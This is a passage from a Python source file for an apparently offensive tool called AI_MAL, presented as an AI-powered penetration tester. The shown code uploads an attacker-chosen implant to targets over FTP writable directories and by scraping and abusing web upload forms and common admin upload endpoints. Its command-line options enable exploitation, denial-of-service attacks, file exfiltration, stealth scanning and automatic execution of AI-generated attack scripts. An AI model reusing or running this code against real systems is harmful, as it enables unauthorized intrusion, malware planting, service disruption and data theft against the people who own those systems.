                            log.write(f"  [ERROR] Upload failed: {str(e)}\n")
                    
                    # Try common writeable directories if primary attempt failed
                    if not success:
                        for directory in ['incoming', 'upload', 'pub', 'public', 'www', 'web', 'htdocs']:
                            try:
                                ftp.cwd(directory)
                                ftp.storbinary(f'STOR {script_name}', io.BytesIO(implant_content))
                                
                                logger.info(f"Successfully uploaded implant to {target} via FTP")
                                with open(log_file, 'a') as log:
                                    log.write(f"  [SUCCESS] Uploaded implant to {directory}/{script_name}\n")
                                    
                                success = True
                                break
                                
                            except Exception:
                                continue
                    
                    ftp.quit()
                    
                    if success:
                        return True
                    
                except Exception as e:
                    logger.debug(f"FTP implant attempt failed: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] {str(e)}\n")
                    
        return success
        
    async def _implant_via_http(self, target: str, open_ports: Dict[int, str],
                              implant_content: bytes, script_extension: str,
                              log_file: Path) -> bool:
        """Deploy implant via HTTP/HTTPS if web upload forms are available"""
        import aiohttp
        import re
        
        # Look for HTTP/HTTPS ports
        http_ports = [port for port, service in open_ports.items() 
                     if service.lower() in ['http', 'https', 'www', 'web'] 
                     or port in [80, 443, 8080, 8443]]
        
        if not http_ports:
            logger.debug(f"No HTTP service detected on {target}")
            return False
            
        success = False
        script_name = os.path.basename(self.implant_path)
        
        # Common web upload endpoints to try
        upload_paths = [
            '/upload.php',
            '/upload',
            '/file-upload',
            '/admin/upload.php',
            '/admin/fileupload',
            '/wp-admin/upload.php',
            '/dashboard/upload',
            '/filemanager/upload.php'
        ]
        
        # Create session for connection reuse
        async with aiohttp.ClientSession() as session:
            for port in http_ports:
                if success:
                    break
                    
                # Determine protocol (HTTP or HTTPS)
                protocol = 'https' if (port == 443 or port == 8443) else 'http'
                base_url = f"{protocol}://{target}:{port}"
                
                logger.info(f"Attempting HTTP implant on {base_url}")
                with open(log_file, 'a') as log:
                    log.write(f"  HTTP attempt: {base_url}\n")
                
                # First, scan the site for upload forms
                try:
                    async with session.get(base_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status == 200:
                            html_content = await response.text()
                            
                            # Look for upload forms
                            upload_form_pattern = re.compile(r'<form.*?enctype="multipart/form-data".*?>', re.IGNORECASE | re.DOTALL)
                            upload_forms = upload_form_pattern.findall(html_content)
                            
                            if upload_forms:
                                form_action_pattern = re.compile(r'action="([^"]+)"', re.IGNORECASE)
                                for form in upload_forms:
                                    match = form_action_pattern.search(form)
                                    if match:
                                        upload_url = match.group(1)
                                        if not upload_url.startswith(('http://', 'https://')):
                                            upload_url = urljoin(base_url, upload_url)
                                            
                                        logger.info(f"Found upload form at {upload_url}")
                                        with open(log_file, 'a') as log:
                                            log.write(f"  Found upload form at {upload_url}\n")
                                            
                                        # Try to upload implant through the form
                                        file_field_pattern = re.compile(r'<input.*?type="file".*?name="([^"]+)"', re.IGNORECASE)
                                        match = file_field_pattern.search(form)
                                        file_field_name = match.group(1) if match else 'file'
                                        
                                        data = aiohttp.FormData()
                                        data.add_field(file_field_name, 
                                                     implant_content,
                                                     filename=script_name,
                                                     content_type='application/octet-stream')
                                        
                                        try:
                                            async with session.post(upload_url, data=data, ssl=False, 
                                                                timeout=aiohttp.ClientTimeout(total=20)) as upload_response:
                                                if upload_response.status in [200, 201, 202]:
                                                    resp_text = await upload_response.text()
                                                    
                                                    # Try to detect success indicators in response
                                                    success_patterns = ['success', 'uploaded', 'complete', 'file saved']
                                                    error_patterns = ['error', 'invalid', 'failed', 'too large']
                                                    
                                                    if any(pattern in resp_text.lower() for pattern in success_patterns) and \
                                                       not any(pattern in resp_text.lower() for pattern in error_patterns):
                                                        logger.info(f"Successfully uploaded implant to {target} via HTTP")
                                                        with open(log_file, 'a') as log:
                                                            log.write(f"  [SUCCESS] Uploaded implant via form\n")
                                                        success = True
                                                        break
                                                    else:
                                                        logger.debug("Upload form submission didn't indicate success")
                                                        with open(log_file, 'a') as log:
                                                            log.write(f"  [ERROR] Form submission response didn't indicate success\n")
                                        except Exception as e:
                                            logger.debug(f"Error submitting upload form: {str(e)}")
                                            with open(log_file, 'a') as log:
                                                log.write(f"  [ERROR] Form submission: {str(e)}\n")
                except Exception as e:
                    logger.debug(f"Error scanning for upload forms: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] Scanning for forms: {str(e)}\n")
                
                # If form scanning didn't work, try common upload endpoints
                if not success:
                    for path in upload_paths:
                        try:
                            upload_url = f"{base_url}{path}"
                            
                            logger.info(f"Trying upload endpoint: {upload_url}")
                            with open(log_file, 'a') as log:
                                log.write(f"  Trying upload endpoint: {upload_url}\n")
                            
                            data = aiohttp.FormData()
                            data.add_field('file', 
                                         implant_content,
                                         filename=script_name,
                                         content_type='application/octet-stream')
                            
                            async with session.post(upload_url, data=data, ssl=False, 
                                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
                                if response.status in [200, 201, 202]:
                                    logger.info(f"Upload endpoint {upload_url} accepted the file")
                                    with open(log_file, 'a') as log:
                                        log.write(f"  [POTENTIAL SUCCESS] Upload endpoint {upload_url} accepted the file\n")
                                    success = True
                                    break
                        except Exception as e:
                            logger.debug(f"Error with upload endpoint {path}: {str(e)}")
        
        return success

async def check_and_pull_ollama_models(models: List[str]) -> Dict[str, bool]:
    """
    Check if specified models are available in Ollama and pull them if not
    
    Args:
        models: List of model names to check and pull
        
    Returns:
        Dictionary with model names as keys and availability as values
    """
    results = {}
    available_models = []
    
    # Check what models are available
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://localhost:11434/api/tags") as response:
                if response.status != 200:
                    logger.warning(f"Ollama API not available: {response.status}")
                    return {model: False for model in models}
                
                data = await response.json()
                available_models = [model["name"] for model in data.get("models", [])]
                logger.debug(f"Available models: {available_models}")
    except Exception as e:
        logger.warning(f"Failed to check Ollama models: {str(e)}")
        return {model: False for model in models}
    
    # Check and pull missing models
    for model in models:
        if not model:
            results[model] = False
            continue
            
        if model in available_models:
            logger.info(f"Model {model} is already available")
            results[model] = True
            continue
        
        # Try to pull the model
        logger.info(f"Pulling model {model}...")
        try:
            process = await asyncio.create_subprocess_exec(
                "ollama", "pull", model,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.warning(f"Failed to pull model {model}: {stderr.decode()}")
                results[model] = False
            else:
                logger.info(f"Successfully pulled model {model}")
                results[model] = True
        except Exception as e:
            logger.warning(f"Error pulling model {model}: {str(e)}")
            results[model] = False
    
    return results

async def list_ollama_models() -> List[str]:
    """
    List all available models in Ollama without installing them
    
    Returns:
        List of available model names
    """
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://localhost:11434/api/tags") as response:
                if response.status != 200:
                    logger.warning(f"Ollama API not available: {response.status}")
                    return []
                
                data = await response.json()
                models = [model["name"] for model in data.get("models", [])]
                return models
    except Exception as e:
        logger.warning(f"Failed to list Ollama models: {str(e)}")
        return []

def configure_event_loop():
    """Configure event loop based on platform"""
    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop

def main():
    parser = argparse.ArgumentParser(description='AI_MAL - AI-Powered Penetration Testing Tool')
    parser.add_argument('target', help='Target IP address or range')
    
    # Basic Options
    basic_group = parser.add_argument_group('Basic Options')
    basic_group.add_argument('--msf', action='store_true', help='Enable Metasploit integration')
    basic_group.add_argument('--exploit', action='store_true', help='Attempt exploitation of vulnerabilities')
    basic_group.add_argument('--model', help='Ollama model to use (default: from .env or qwen2.5-coder:7b)')
    basic_group.add_argument('--fallback-model', help='Fallback Ollama model (default: from .env or mistral:7b)')
    basic_group.add_argument('--full-auto', action='store_true', help='Enable full automation mode')
    
    # Script Generation Options
    script_group = parser.add_argument_group('Script Generation Options')
    script_group.add_argument('--custom-scripts', action='store_true', help='Enable AI-powered script generation')
    script_group.add_argument('--script-type', choices=['python', 'bash', 'ruby'], default='python',
                      help='Type of script to generate')
    script_group.add_argument('--execute-scripts', action='store_true', help='Automatically execute generated scripts')
    
    # Scanning Options
    scan_group = parser.add_argument_group('Scanning Options')
    scan_group.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    scan_group.add_argument('--continuous', action='store_true', help='Run continuous scanning')
    scan_group.add_argument('--delay', type=int, default=300, help='Delay between scans in seconds')
    scan_group.add_argument('--services', action='store_true', help='Enable service detection')
    scan_group.add_argument('--version', action='store_true', help='Enable version detection')
    scan_group.add_argument('--os', action='store_true', help='Enable OS detection')
    scan_group.add_argument('--vuln', action='store_true', help='Enable vulnerability scanning')
    scan_group.add_argument('--dos', action='store_true', help='Attempt Denial of Service attacks')
    scan_group.add_argument('--exfil', action='store_true', help='Attempt to exfiltrate files from target systems')
    scan_group.add_argument('--implant', metavar='PATH', help='Path to a script to implant on target machines')
    
    # Output Options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('--output-dir', help='Output directory for results (default: from .env or scan_results)')
    output_group.add_argument('--output-format', choices=['xml', 'json'], default='json',
                      help='Output format for scan results')
    output_group.add_argument('--quiet', action='store_true', help='Suppress progress output and logging to console')
    output_group.add_argument('--no-gui', action='store_true', 
                      help='Disable the terminal GUI features (uses plain text output instead)')
    
    # Advanced Options
    advanced_group = parser.add_argument_group('Advanced Options')
    advanced_group.add_argument('--iterations', type=int, default=1, help='Number of scan iterations')
    advanced_group.add_argument('--custom-vuln', help='Path to custom vulnerability definitions')
    advanced_group.add_argument('--ai-analysis', action='store_true', default=True,
                      help='Enable AI analysis of results')
    
    args = parser.parse_args()
    
    # Set output directory from args or environment
    output_dir = args.output_dir or os.getenv('SCAN_RESULTS_DIR', 'scan_results')
    
    # Create output directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)
    
    # If rich is not available and GUI is requested, try to install it
    if not RICH_AVAILABLE and not args.no_gui:
        try:
            if not args.quiet:
                print("Pseudo GUI requested but rich library not found. Attempting to install...")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
            print("Rich library installed successfully!")
            print("Please restart the command to use the GUI interface.")
            sys.exit(0)
        except Exception as e:
            if not args.quiet:
                print(f"Failed to install rich library: {str(e)}")
                print("Continuing without GUI...")

    # Verify Ollama models (only if AI analysis is enabled)
    if args.ai_analysis and not args.quiet:
        try:
            primary_model = args.model or os.getenv('OLLAMA_MODEL', 'qwen2.5-coder:7b')
            fallback_model = args.fallback_model or os.getenv('OLLAMA_FALLBACK_MODEL', 'mistral:7b')
            
            print(f"Verifying AI models availability: {primary_model} (primary) and {fallback_model} (fallback)")
            
            # Create a new event loop for checking and pulling models
            loop = configure_event_loop()
            
            # Check for available models first
            available_models = []
            try:
                available_models = loop.run_until_complete(list_ollama_models())
                if available_models:
                    print(f"Found {len(available_models)} available Ollama models")
            except Exception as e:
                print(f"Warning: Could not check available Ollama models: {str(e)}")
            
            # Define the default models that should be auto-installed if not available
            default_models = ['qwen2.5-coder:7b', 'gemma:7b']
            models_to_check = []
            
            # Only add models to auto-install list if they're in our default set
            if primary_model in default_models:
                models_to_check.append(primary_model)
            
            if fallback_model in default_models and fallback_model != primary_model:
                models_to_check.append(fallback_model)
            
            # Check and pull default models if needed
            if models_to_check:
                print(f"Checking if default models need to be installed: {', '.join(models_to_check)}")
                model_results = loop.run_until_complete(check_and_pull_ollama_models(models_to_check))
            else:
                model_results = {}
                
            # Check if primary model is available
            primary_available = primary_model in available_models or model_results.get(primary_model, False)
            if not primary_available:
                print(f"Warning: Primary model {primary_model} is not available and is not a default model for auto-install.")
                
                # Try to find an available model to use instead
                available_alternatives = [m for m in default_models if m in available_models or model_results.get(m, False)]
                if available_alternatives:
                    print(f"Using {available_alternatives[0]} as primary model instead.")
                    args.model = available_alternatives[0]
                
            # Check if fallback model is available
            fallback_available = fallback_model in available_models or model_results.get(fallback_model, False)
            if not fallback_available:
                print(f"Warning: Fallback model {fallback_model} is not available and is not a default model for auto-install.")
                
                # Try to find an available model to use as fallback
                available_alternatives = [m for m in default_models if m in available_models or model_results.get(m, False)]
                if available_alternatives and available_alternatives[0] != args.model and len(available_alternatives) > 1:
                    print(f"Using {available_alternatives[1 if available_alternatives[0] == args.model else 0]} as fallback model instead.")
                    args.fallback_model = available_alternatives[1 if available_alternatives[0] == args.model else 0]
            
            # Close the loop properly
            loop.close()
        except Exception as e:
            print(f"Warning: Error during Ollama model verification: {str(e)}")
            print("Continuing with scan, will use fallback if models are unavailable.")
    
    # Initialize and run AI_MAL
    args_dict = vars(args)
    target = args_dict.pop('target')  # Remove target from args dict to avoid duplicate argument
    ai_mal = AI_MAL(target, **args_dict)

    try:
        # Create a new event loop instead of getting the current one
        # This fixes the deprecation warning
        loop = configure_event_loop()
        scan_results = loop.run_until_complete(ai_mal.run())
        
        # Ensure proper cleanup of the event loop
        clean_up_loop(loop)
        
        # Save results or do any post-processing here
        output_file = os.path.join(output_dir, f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(output_file, 'w') as f:
            json.dump(scan_results, f, indent=2)
        
        print(f"Scan results saved to: ")
        print(output_file)
        
        return 0
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        return 1
    except Exception as e:
        print(f"Fatal error: {str(e)}")
        # Print traceback for debugging
        if os.getenv('DEBUG'):
            import traceback
            traceback.print_exc()
        return 1
    
def clean_up_loop(loop):
    """Properly clean up the event loop and any pending tasks/subprocesses."""
    try:
        # Cancel all running tasks
        tasks = [task for task in asyncio.all_tasks(loop) if not task.done()]
        if tasks:
            for task in tasks:
                task.cancel()
            # Allow time for tasks to cancel
            if tasks:
                loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
        
        # Close the loop
        loop.run_until_complete(loop.shutdown_asyncgens())
        
        # Python 3.9+ has this method
        if hasattr(loop, 'shutdown_default_executor'):
            loop.run_until_complete(loop.shutdown_default_executor())
            
    except Exception as e:
        # Just log errors during cleanup, don't raise
        print(f"Warning: Error during event loop cleanup: {e}")
    finally:
        # Ensure loop is closed
        if not loop.is_closed():
            loop.close()

if __name__ == "__main__":
    main() 